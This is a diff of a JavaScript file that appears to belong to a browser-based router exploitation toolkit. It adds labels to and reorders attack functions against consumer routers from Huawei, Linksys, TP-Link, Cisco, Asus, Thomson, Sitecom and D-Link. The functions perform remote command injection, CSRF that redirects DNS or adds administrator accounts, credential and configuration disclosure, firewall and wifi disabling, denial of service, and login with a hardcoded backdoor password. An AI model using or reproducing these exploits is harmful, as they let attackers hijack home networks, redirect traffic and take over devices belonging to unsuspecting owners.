@@ -372,7 +372,7 @@ function hg866passr() {
 		
 	}
 
-// HG866 Denial of service
+// Huawei HG866 Denial of service
 	function hg866dosr() {
 		ip=prompt("IP:");
 		document.hg866dos.action="http://"+ip+"/html/admin_reboot.html";
@@ -686,6 +686,7 @@ function dgn2200_opentelnet(ip)
 	post('http://' + ip + '/ping.cgi', form);
 }
 
+// Linksys WRT160nv2 - apply.cgi Remote Command Injection
 function wrt160nv2_command(ip)
 {
 	ip = ip || "192.168.1.1";
@@ -703,11 +704,11 @@ function wrt160nv2_command(ip)
 	post('http://admin:admin@' + ip + '/apply.cgi', form);
 }
 
-// Linksys WRT110 Remote Command Execution
 function afterTwoSeconds() {    
     authWindow.close(); 
 }
 
+// Linksys WRT110 Remote Command Execution
 function wrt110_command(ip)
 {
 	ip = ip || "192.168.1.1";
@@ -719,16 +720,14 @@ function wrt110_command(ip)
 	post('http://admin@admin@' + ip + '/ping.cgi', form);
 }
 
-
-
+// TP-Link WR1043ND - Change DNS CSRF
 function wr1043nd_dnscsrf(ip)
 {
 	ip = ip || "192.168.1.1";
 	dns_primary = prompt("DNS Primary:");
 	dns_secundary = prompt("DNS Secondary:");
 	var url = "/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&ip1=192.168.1.100&ip2=192.168.1.199&Lease=120&gateway=0.0.0.0&domain=&dnsserver=" + dns_primary + "+&dnsserver2=" + dns_secondary + "&Save=%B1%A3+%B4%E6";
-	document.location("http://" + ip + url); 
-
+	document.location("http://" + ip + url);
 }
 
 // Cisco EPC3925 - Change Admin Password CSRF
@@ -741,6 +740,7 @@ function epc3925_changepassword(ip)
 	post('http://' + ip + '/goform/Quick_setup', form);
 }
 
+// Cisco DPC/EPC3925 - Persistent Cross Site Scripting
 function epc3925_postxss(ip)
 {
     ip = ip || "192.168.0.1";
@@ -785,7 +785,7 @@ function x3000_addadmin(ip)
 	post('http://' + ip + '/apply.cgi', form);
 }
 
-
+// Freebox V6 Authentication Bypass Reboot
 function freeboxdosr() {
 	ip=prompt("IP:");
 	document.freeboxdos.action="http://"+ip+"/system.cgi";
@@ -801,6 +801,7 @@ function brightbox_configdisclosure(ip)
     document.location="http://"+ip+"/cgi/cgi_status.js";
 }
 
+// Huawei HG5XX remote ppp password disclosure
 function huapppr(){
 	ip=prompt("IP:");
 	img1.src="http://"+ip+"/Listadeparametros.html";
@@ -810,6 +811,7 @@ function huapppr(){
 	}
 }
 
+// Asus RT-N66U command execution
 function rtn66uexe(){
 	ip=prompt("IP:");
 	cmd=prompt("Command:");
@@ -820,6 +822,7 @@ function rtn66uexe(){
 	}
 }
 
+// Asus RT-N56U RT-AC66U command execution
 function N56Uexe(){
 	ip=prompt("IP:");
 	cmd=prompt("Command:");
@@ -830,12 +833,14 @@ function N56Uexe(){
 	}
 }
 
+// Huawei HG5XX remote ppp password disclosure
 function huappp(){
 	img1.src="http://192.168.1.254/Listadeparametros.html";
 	alert("Continue");
 	document.location="http://192.168.1.254/wanfun.js";
 }
 
+// 2 Wire 17x 18x 20x 27x 38x Add domain to hosts table CSRF
 function wireAddHosts() {
 	dominio=prompt("Redirect this host:");
 	ip=prompt("to this IP:");
@@ -843,7 +848,6 @@ function wireAddHosts() {
 		document.location="http://home/xslt?PAGE=J38_SET&THISPAGE=J38&NEXTPAGE=J38_SET&NAME="+dominio+"&ADDR="+ip;
 	}
 }
-
 function wireAddHostsip() {
 	routerip=prompt("Router IP:");
 	dominio=prompt("Redirect this host:");
@@ -852,6 +856,8 @@ function wireAddHostsip() {
 		document.location="http://"+routerip+"/xslt?PAGE=J38_SET&THISPAGE=J38&NEXTPAGE=J38_SET&NAME="+dominio+"&ADDR="+ip;
 	}
 }
+
+// 2 Wire 17x 18x 20x 27x CRLF denial of service remote MDC
 function wirecrlfr() {
 	ip=prompt("IP:");
 	if (ip==null || ip==""){}else{
@@ -865,6 +871,7 @@ function wirecrlf() {
 	}
 }
 
+// Siemens 5200 Default administrator account
 function ssDefaultPass() {
 	ip=prompt("Remote IP:");
 		if (ip==null || ip==""){}else{
@@ -872,6 +879,7 @@ function ssDefaultPass() {
 	}
 }
 
+// Thomson ST585 Redirect domain CSRF
 function thomsondom() {
 	dominio=prompt("Redirect this domain:");
 	document.thomsondom.dom1.value=dominio;
@@ -879,31 +887,6 @@ function thomsondom() {
 	document.thomsondom.dom2.value=dominio2;
 	if (dominio==null || dominio=="" || dominio2==null || dominio2==""){}else{
 		document.thomsondom.submit();
-	}
-}
-function thomsonadmin() {
-	admin=prompt("Add administrator user(password):");
-	document.thomsonadmin.elements[4].value=admin;
-	document.thomsonadmin.action="http://192.168.1.254/cgi/b/users/cfg/usraccedit/?be=0&l0=2&l1=9";
-	if (admin==null || admin==""){}else{
-		document.thomsonadmin.submit();
-	}
-}
-
-function thomsonadminr() {
-	ip=prompt("IP");
-	admin=prompt("Add administrator user(password):");
-	document.thomsonadmin.elements[4].value=admin;
-	document.thomsonadmin.action="http://"+ip+"/cgi/b/users/cfg/usraccedit/?be=0&l0=2&l1=9";
-	if (ip==null || ip==""){}else{
-		document.thomsonadmin.submit();
-	}
-}
-function thomsoncall() {
-	num=prompt("Call this phone number:");
-	document.thomsoncall.elements[1].value=num;
-	if (num==null || num==""){}else{
-		document.thomsoncall.submit();
 	}
 }
 function thomsondomr() {
@@ -918,6 +901,33 @@ function thomsondomr() {
 	}
 }
 
+// Thomson ST585 Add administrator account CSRF
+function thomsonadmin() {
+	admin=prompt("Add administrator user(password):");
+	document.thomsonadmin.elements[4].value=admin;
+	document.thomsonadmin.action="http://192.168.1.254/cgi/b/users/cfg/usraccedit/?be=0&l0=2&l1=9";
+	if (admin==null || admin==""){}else{
+		document.thomsonadmin.submit();
+	}
+}
+function thomsonadminr() {
+	ip=prompt("IP");
+	admin=prompt("Add administrator user(password):");
+	document.thomsonadmin.elements[4].value=admin;
+	document.thomsonadmin.action="http://"+ip+"/cgi/b/users/cfg/usraccedit/?be=0&l0=2&l1=9";
+	if (ip==null || ip==""){}else{
+		document.thomsonadmin.submit();
+	}
+}
+
+// Thomson bthomehub call number (voice-jacking) auth bypass
+function thomsoncall() {
+	num=prompt("Call this phone number:");
+	document.thomsoncall.elements[1].value=num;
+	if (num==null || num==""){}else{
+		document.thomsoncall.submit();
+	}
+}
 function thomsoncallr() {
 	ip=prompt("IP:");
 	num=prompt("Call this phone number:");
@@ -927,6 +937,8 @@ function thomsoncallr() {
 		document.thomsoncall.submit();
 	}
 }
+
+// Thomson bthomehub enable remote access and change tech password
 function btra() {
 	pass=prompt("Change tech password to:");
 	document.btra.elements[2].value=pass;
@@ -943,6 +955,8 @@ function btrar() {
 		document.btra.submit();
 	}
 }
+
+// Thomson bthomehub disable wifi
 function btwifir() {
 	ip=prompt("IP:");
 	document.btwifi.action="http://"+ip+"/cgi/b/_wli_/cfg//";
@@ -950,6 +964,8 @@ function btwifir() {
 		document.btwifi.submit();
 	}
 }
+
+// Huawei SmartAX MT880 add administrator account
 function mt880admin() {
 	admin=prompt("Add administrator user(password):");
 	if (admin==null || admin==""){}else{
@@ -964,11 +980,13 @@ function mt880adminr() {
 	}
 }
 
+// Sitecom DC-227 Backdoor account
 function dc227backdoor() {
 	ip=prompt("IP:");
 	document.location="http://adsl:epicrouter2007@"+ip;
 }
 
+// D-Link DSL-2740B - Disable Firewall
 function dsl2740b_disablefirewall(ip)
 {
 	ip = ip || "192.168.1.1";
@@ -978,6 +996,7 @@ function dsl2740b_disablefirewall(ip)
 	post('http://' + ip + '/scdmz.cmd', form);
 }
 
+// Huawei SmartAX MT880 disable firewall/anti-dos w/default pass
 function mt880fw() {
 	ip=prompt("IP:");
 	admin=prompt("Add administrator user(password):");
